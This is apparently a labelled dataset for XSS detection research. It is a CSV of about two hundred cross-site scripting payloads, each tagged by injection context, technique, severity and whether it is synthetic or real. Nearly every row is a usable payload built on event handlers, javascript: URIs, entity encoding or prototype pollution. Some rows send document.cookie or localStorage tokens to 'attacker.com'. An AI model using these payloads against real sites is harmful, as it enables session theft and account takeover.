payload,context,technique,severity,length,source
"""><Img srC=x onProMptActIon=coNsoLe.Log('XSS')>",attribute_escape,synthetic,medium,47,synthetic
onk&#101;ydown=prompt&#40;loc&#97;tion.h&#97;sh&#41;,event_handler,synthetic,low,52,synthetic
<s&#101;l&#101;ct/onvolum&#101;ch&#97;ng&#101;=consol&#101;.log(1)>,tag_injection,synthetic,low,67,synthetic
"document.querySelector(""body"").innerHTML+=""prompt(location.hash)""",dom_sink,synthetic,high,65,synthetic
'><img src=x onended=alert('XSS')>,attribute_escape,synthetic,medium,34,synthetic
JAVASCRIPT:cOnsOle.loG(1),js_uri,synthetic,medium,25,synthetic
"<img2 id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></img2>",tag_injection,none,medium,84,real
"""`'><script>\xEF\xBF\xAEjavascript:alert(9603)</script>",script_injection,none,medium,55,real
"\"" OnpRomPtdIsmIss=prOmpT(1)//",attribute_escape,synthetic,medium,30,synthetic
"<rt draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</rt>",tag_injection,none,medium,81,real
"<blockquote draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</blockquote>",tag_injection,none,medium,96,real
"<q draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</q>",tag_injection,none,medium,80,real
"<style>@keyframes x{}</style><command style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></command>",tag_injection,none,medium,107,real
"<ol onmouseover=""alert(1)"">AnonKryptiQuz</ol>",tag_injection,none,medium,45,real
"""><Img srC=x onBefOrePasTe=AleRt('XSS')>",attribute_escape,synthetic,medium,40,synthetic
"setInterval(""console.log(navigator.sendBeacon('//attacker.com',document.cookie))"",100)",dom_sink,synthetic,high,86,synthetic
"__pRotO__[""oNcaNplAy""]=aLerT(bToa(doCumEnt.coOkiE))",dom_sink,synthetic,high,51,synthetic
"document.body.innerHTML=""%3Cimg src=x onerror=console.log(location.hash)%3E""",dom_sink,synthetic,high,76,synthetic
""" %3E%3Csvg onauxclick=console.log(1)%3E",attribute_escape,synthetic,medium,40,synthetic
%22 ><svg onend=console.log(%27XSS%27)>,attribute_escape,synthetic,medium,39,synthetic
"""><img src=x ongotpointercapture=alert(document.domain)>",attribute_escape,synthetic,medium,56,synthetic
&quOt; onTogGle=prOmpT(1) x=&qUot;,attribute_escape,synthetic,medium,34,synthetic
"<style>@keyframes x{}</style><code style=""animation-name:x"" onanimationstart=""alert(1)""></code>",tag_injection,none,medium,95,real
OnbEfoRecOpy=jaVasCriPt:ConSolE.lOg('XSS'),event_handler,synthetic,medium,42,synthetic
"<form ondblclick=""alert(1)"">AnonKryptiQuz</form>",tag_injection,none,medium,48,real
"onclose=javascript:\u0061lert(String.fromCharCode(88,83,83))",event_handler,synthetic,high,60,synthetic
"<;META HTTP-EQUIV="";refresh""; CONTENT="";0;url=javascript:alert(';XSS';);"";>;",js_uri,none,medium,76,real
""" ontoggl&#101;=consol&#101;.log('XSS') """,attribute_escape,synthetic,low,41,synthetic
%22><img src=x ongestureend=console.log(location.hash)>,attribute_escape,synthetic,medium,55,synthetic
"""%3E%3Cscript%3Eprompt(String.fromCharCode(88,83,83))%3C/script%3E",script_injection,synthetic,high,66,synthetic
%22><img src=x onbeforematch=confirm(1)>,attribute_escape,synthetic,medium,40,synthetic
<image2 onpointermove=alert(1) style=display:block>AnonKryptiQuz</image2>,tag_injection,none,medium,73,real
"<img\x10src=x onerror=""javascript:alert(4586)"">",js_uri,none,medium,47,real
<noscript onmousewheel=alert(1) style=display:block>requires scrolling,tag_injection,none,medium,70,real
' oNseArcH=pRomPt(DocUmeNt.DomAin) ',attribute_escape,synthetic,medium,36,synthetic
"__pRotO__[""oNcoPy""]=eVal(doCumEnt.doMaiN)",dom_sink,synthetic,low,41,synthetic
onpointermove=\u0061lert/***/('XSS'),event_handler,synthetic,low,36,synthetic
' onbeforecut=confirm(1) ',attribute_escape,synthetic,medium,26,synthetic
"<tt onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</tt>",tag_injection,none,medium,63,real
"<style draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</style>",tag_injection,none,medium,88,real
"'""/><img src= x onerror='alert(document.domain)'>",dom_sink,none,medium,49,real
"""%3E%3Cimg src=x onselect=confirm(location.hash)%3E",attribute_escape,synthetic,medium,51,synthetic
{{ lipsum.__globals__['os'].popen('prompt').read() }},template_injection,synthetic,low,53,synthetic
'><img src=x ons&#101;curitypolicyviol&#97;tion=consol&#101;.log(docum&#101;nt.dom&#97;in)>,attribute_escape,synthetic,low,91,synthetic
"<style>@keyframes x{}</style><center style=""animation-name:x"" onanimationstart=""alert(1)""></center>",tag_injection,none,medium,99,real
\%22 ontoggle=console.log(1)//,attribute_escape,synthetic,medium,30,synthetic
' ><svg onpointerover=console.log('XSS')>,attribute_escape,synthetic,medium,41,synthetic
"""%3E%3Cimg src=x onpointerrawupdate=alert('XSS')%3E",attribute_escape,synthetic,medium,51,synthetic
<title src=x onmozfullscreenchange=prompt('XSS')>,tag_injection,synthetic,medium,49,synthetic
"(n&#101;w Function(""&#101;v&#97;l(n&#97;vig&#97;tor.s&#101;ndB&#101;&#97;con('//&#97;tt&#97;ck&#101;r.com',docum&#101;nt.cooki&#101;))""))();",dom_sink,synthetic,low,140,synthetic
`><img src=x onw&#97;iting=prompt(docum&#101;nt.dom&#97;in)>,attribute_escape,synthetic,medium,60,synthetic
""" onerror=\u0061lert(document.domain) """,attribute_escape,synthetic,low,39,synthetic
 onmous&#101;&#101;nt&#101;r=prompt(docum&#101;nt.dom&#97;in),event_handler,synthetic,medium,61,synthetic
	ondragover=confirm(1),event_handler,synthetic,medium,22,synthetic
<xmp onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,53,real
\' OnpAstE=cOnsOle.loG(1)//,attribute_escape,synthetic,medium,27,synthetic
%27 onpointercancel=prompt(1) %27,attribute_escape,synthetic,medium,33,synthetic
"""><img src=x onh&#97;shch&#97;ng&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)>",attribute_escape,synthetic,low,82,synthetic
<b&#97;s&#101; ontr&#97;nsitionst&#97;rt=prompt(loc&#97;tion.h&#97;sh)/>,tag_injection,synthetic,medium,72,synthetic
(new Function(%22alert(1)%22))();,dom_sink,synthetic,high,33,synthetic
<svg/onload​=alert/*1337*/(1)>,generic,comment_injection,low,30,real
""" ><svg onb&#101;for&#101;cut=consol&#101;.log(1)>",attribute_escape,synthetic,low,50,synthetic
onclose=console.log/*x*/('XSS'),event_handler,synthetic,low,31,synthetic
"""><dialog onended=console.log(1)>",tag_injection,synthetic,medium,33,synthetic
<noscript src=x onbeforematch=console.log('XSS')>,tag_injection,synthetic,medium,49,synthetic
&quot; ongesturestart=\u0061lert(1) x=&quot;,attribute_escape,synthetic,low,44,synthetic
"__proto__[%22onpointercancel%22]=console.log(String.fromCharCode(88,83,83))",dom_sink,synthetic,high,75,synthetic
`><img src=x ong&#101;stur&#101;&#101;nd=prompt(1)>,attribute_escape,synthetic,medium,51,synthetic
<nextid onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</nextid>,tag_injection,none,medium,78,real
"' ><svG oNbeGin=alErt(StRinG.fRomChaRCoDe(88,83,83))>",attribute_escape,synthetic,high,53,synthetic
__proto__[%22onsubmit%22]=alert(document.cookie),dom_sink,synthetic,high,48,synthetic
' oncanplay=console.log(location.hash) ',attribute_escape,synthetic,medium,40,synthetic
"<animatemotion onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></animatemotion>",tag_injection,none,medium,299,real
`><Img srC=x onAuxCliCk=ConFirM(lOcaTioN.hAsh)>,attribute_escape,synthetic,medium,47,synthetic
"\' onload=alert(String.fromCharCode(88,83,83))//",attribute_escape,synthetic,high,48,synthetic
<x @click='_b.constructor`alert(1)`()'>click</x>,attribute_escape,none,medium,48,real
<object onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,57,real
<plAinTexT	oNtoUchStaRt=AleRt(1)>,tag_injection,synthetic,medium,33,synthetic
<s&#101;l&#101;ct/ongotpoint&#101;rc&#97;ptur&#101;=confirm(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,medium,86,synthetic
"__proto__[""onsecuritypolicyviolation""]=eval(localStorage.getItem('token'))",dom_sink,synthetic,high,74,synthetic
"<section oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</section>",tag_injection,none,medium,77,real
<foRm OnwEbkItaNimAtiOneNd=ProMpt('XSS')/>,tag_injection,synthetic,medium,42,synthetic
<script>/*/alert(1)</script>,script_injection,synthetic,medium,28,synthetic
<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1),tag_injection,none,medium,66,real
"javascript:/*--></script></textarea></style></noscript>\""</noembed>[`</template>[""</select>['</title>]<<script>///<frame */ onload=alert()//<</script>",script_injection,comment_injection,medium,150,real
"<style>@keyframes x{}</style><rp style=""animation-name:x"" onwebkitanimationend=""alert(1)""></rp>",tag_injection,none,medium,95,real
"<thead draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</thead>",tag_injection,none,medium,68,real
"""><table onselect=confirm(document.domain)>",tag_injection,synthetic,medium,43,synthetic
""" ><svg onpl&#97;y=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,medium,66,synthetic
"<body
onpointermove=alert(location.hash)>",tag_injection,synthetic,medium,41,synthetic
%22 ondblclick=confirm(1) %22,attribute_escape,synthetic,medium,29,synthetic
"&quOt; onProMptDisMisS=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83)) x=&qUot;",attribute_escape,synthetic,high,70,synthetic
"<section onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</section>",tag_injection,none,medium,73,real
"<wbr onmouseover=""alert(1)"">AnonKryptiQuz</wbr>",tag_injection,none,medium,47,real
"\' OnmOzfUllScrEenChaNge=alErt(StRinG.fRomChaRCoDe(88,83,83))//",attribute_escape,synthetic,high,63,synthetic
{{cOnfIrm|coNstRucTor:doCumEnt.coOkiE}},template_injection,synthetic,high,39,synthetic
""" onscrollsn&#97;pch&#97;ng&#101;=consol&#101;.log(1) """,attribute_escape,synthetic,low,55,synthetic
"location=""javascr	ipt:prompt('XSS')""",dom_sink,synthetic,high,36,synthetic
<ifr&#97;m&#101;	oninput=consol&#101;.log(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,low,65,synthetic
<!--><select onpointermove=prompt('XSS')>,tag_injection,synthetic,medium,41,synthetic
"""%3E%3Cimg src=x oncut=prompt(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,63,synthetic
<noscript/onbeforematch=console.log('XSS')>,tag_injection,synthetic,medium,43,synthetic
&lt;iframe src=http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html&gt;,generic,html_entity,low,69,real
<&#97;nim&#97;t&#101;motion/onw&#97;iting=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,low,80,synthetic
"""%3E%3Cspan oncopy=prompt(location.hash)%3E",tag_injection,synthetic,medium,43,synthetic
'><img src=x onpointermove=\u0061lert(document.domain)>,attribute_escape,synthetic,low,55,synthetic
"<tr draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</tr>",tag_injection,none,medium,82,real
#prompt(%27XSS%27),template_injection,synthetic,medium,18,synthetic
"<menuitem draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</menuitem>",tag_injection,none,medium,74,real
"""><img src=x oninput=confirm(1)>",attribute_escape,synthetic,medium,32,synthetic
`><Img srC=x onRepEat=alErt(loCatIon.haSh)>,attribute_escape,synthetic,medium,43,synthetic
%27><img src=x onsecuritypolicyviolation=prompt(1)>,attribute_escape,synthetic,medium,51,synthetic
"loc&#97;tion=""j&#97;v&#97;script:&#97;l&#101;rt(loc&#97;tion.h&#97;sh)""",dom_sink,synthetic,low,71,synthetic
 onmousewheel=console.log(%27XSS%27),event_handler,synthetic,medium,36,synthetic
%3Cobject/onwebkitanimationend=alert(location.hash)%3E,tag_injection,synthetic,medium,54,synthetic
<emBed srC=x onMouSeeNteR=cOnfIrm('XSS')>,tag_injection,synthetic,medium,41,synthetic
"onanimationiteration=javascript:console.log(String.fromCharCode(88,83,83))",event_handler,synthetic,high,74,synthetic
"<a style=""-o-link:'javascript:javascript:alert(8271)';-o-link-source:current"">X",js_uri,none,medium,79,real
&quot; on&#97;uxclick=&#97;l&#101;rt(1) x=&quot;,attribute_escape,synthetic,low,48,synthetic
*/</script>'>alert(1)/*<script/1=',script_injection,none,medium,34,real
"<svg ondblclick=""alert(1)"">AnonKryptiQuz</svg>",tag_injection,none,medium,46,real
"<style>:target {transform: rotate(180deg);}</style><time id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></time>",tag_injection,none,medium,126,real
"<body	onfocusout=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,medium,64,synthetic
<noembed onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,58,real
OnbEgiN=jAvaScrIpt:coNsoLe.Log('XSS'),event_handler,synthetic,medium,37,synthetic
<code id=x tabindex=1 onfocus=alert(1)></code>,tag_injection,none,medium,46,real
"docum&#101;nt.body.inn&#101;rHTML=""<img src=x on&#101;rror=consol&#101;.log('XSS')>""",dom_sink,synthetic,low,84,synthetic
"""><img src=x oncanplay=prompt(document.domain)>",attribute_escape,synthetic,medium,47,synthetic
' oncontextmenu=\u0061lert(document.domain) ',attribute_escape,synthetic,low,45,synthetic
`><img src=x onpagereveal=\u0061lert(location.hash)>,attribute_escape,synthetic,low,52,synthetic
"<map draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</map>",tag_injection,none,medium,83,real
"<div onpointermove=""alert(45)"">MOVE HERE</div>",tag_injection,none,medium,46,real
%22><img src=x ondblclick=alert(1)>,attribute_escape,synthetic,medium,35,synthetic
\%22 onended=prompt(%27XSS%27)//,attribute_escape,synthetic,medium,32,synthetic
"<BASE HREF=""javascript:javascript:alert(6507);//"">",js_uri,case_variation,medium,50,real
"<div draggable=""true"" contenteditable>drag me</div><svg ondragover=alert(1) contenteditable style=display:block>drop here</svg>",tag_injection,none,medium,127,real
oncanplay=javascr	ipt:confirm(1),event_handler,synthetic,medium,32,synthetic
"""><SelEct onAniMatIonStaRt=ProMpt('XSS')>",tag_injection,synthetic,medium,41,synthetic
"<pre draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</pre>",tag_injection,none,medium,64,real
<animate onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</animate><input value=clickme>,tag_injection,none,medium,105,real
<meTa	OndRop=alErt(doCumEnt.doMaiN)>,tag_injection,synthetic,medium,36,synthetic
"""%3E%3Cimg onwebkitfullscreenchange=alert('XSS')%3E",tag_injection,synthetic,medium,51,synthetic
>alert(1)</script>,generic,none,medium,18,real
<set/onend=\u0061lert(1)>,tag_injection,synthetic,low,25,synthetic
"<style>:target {color:red;}</style><article id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></article>",tag_injection,none,medium,118,real
"__proto__[""onmozfullscreenchange""]=prompt(localStorage.getItem('token'))",dom_sink,synthetic,high,72,synthetic
' oNgeStuResTarT=aLerT(lOcaTioN.hAsh) ',attribute_escape,synthetic,medium,39,synthetic
`><img src=x onwheel=alert('XSS')>,attribute_escape,synthetic,medium,34,synthetic
\%22 oncut=confirm(1)//,attribute_escape,synthetic,medium,23,synthetic
"”><svg onload=alert&#0000000040""1"")>",tag_injection,html_entity,low,36,real
"'><img src=x onwaiting=prompt(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,61,synthetic
<scRipT>FUncTioN('ConSolE.lOg(DocUmeNt.DomAin)')();</sCriPt>,script_injection,synthetic,medium,60,synthetic
	onmous&#101;&#101;nt&#101;r=&#97;l&#101;rt(1),event_handler,synthetic,low,46,synthetic
"'%3E%3Cscript%3Econfirm(String.fromCharCode(88,83,83))%3C/script%3E",script_injection,synthetic,high,67,synthetic
"<style>@keyframes x{}</style><progress style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></progress>",tag_injection,none,medium,109,real
"document.write(""%3Cimg src=x onerror=eval('//attacker.com/?c='+document.cookie)%3E"")",dom_sink,synthetic,high,84,synthetic
<a2 onmousewheel=alert(1) style=display:block>requires scrolling,tag_injection,none,medium,64,real
"<scr	ipt>setTimeout('alert('XSS')',0)</scr	ipt>",script_injection,synthetic,medium,47,synthetic
<tr onpointerout=alert(1) style=display:block>AnonKryptiQuz</tr>,tag_injection,none,medium,64,real
"%3Cset
onwebkitfullscreenchange=console.log('XSS')%3E",tag_injection,synthetic,medium,53,synthetic
""" %3E%3Csvg onpopstate=alert(document.domain)%3E",attribute_escape,synthetic,medium,48,synthetic
"<nextid onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</nextid>",tag_injection,none,medium,68,real
"<thead onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</thead>",tag_injection,none,medium,71,real
"LocAtiOn.HreF=""JavAscRipT:pRomPt(StrIng.frOmCHarCodE(88,83,83))""",dom_sink,synthetic,high,64,synthetic
"<frame oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,99,real
"<title draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</title>",tag_injection,none,medium,63,real
"DocUmeNt.WriTe(""<iMg Src=x OneRroR=fEtcH(lOcaTioN.hAsh)>"")",dom_sink,synthetic,high,58,synthetic
<p id=x tabindex=1 onfocusin=alert(1)></p>,tag_injection,none,medium,42,real
<scRipT x=y OnkEydOwn=coNfiRm(DocUmeNt.DomAin)>,tag_injection,synthetic,medium,47,synthetic
oncanplay=console.log/*x*/('XSS'),event_handler,synthetic,low,33,synthetic
<;IMG SRC=JaVaScRiPt:alert(';XSS';)>;,js_uri,none,medium,37,real
"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:alert(5202);"">",js_uri,case_variation,medium,67,real
'><img src=x onhashchange=alert('XSS')>,attribute_escape,synthetic,medium,39,synthetic
onpointermove=javascript:console.log(1),event_handler,synthetic,medium,39,synthetic
"<audio onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</audio>",tag_injection,none,medium,63,real
"ABC<div style=""x:\x0Bexpression(javascript:alert(1)"">DEF",js_uri,none,medium,56,real
"&quot; onstalled=console.log(String.fromCharCode(88,83,83)) x=&quot;",attribute_escape,synthetic,high,68,synthetic
"""><img src=x ong&#101;stur&#101;st&#97;rt=prompt('XSS')>",attribute_escape,synthetic,medium,56,synthetic
"	onpageshow=prompt(String.fromCharCode(88,83,83))",event_handler,synthetic,high,49,synthetic
%3Cscript%3E/x/prompt('XSS')%3C/script%3E,script_injection,synthetic,medium,41,synthetic
"<style>@keyframes x{}</style><center style=""animation-name:x"" onanimationend=""alert(1)""></center>",tag_injection,none,medium,97,real
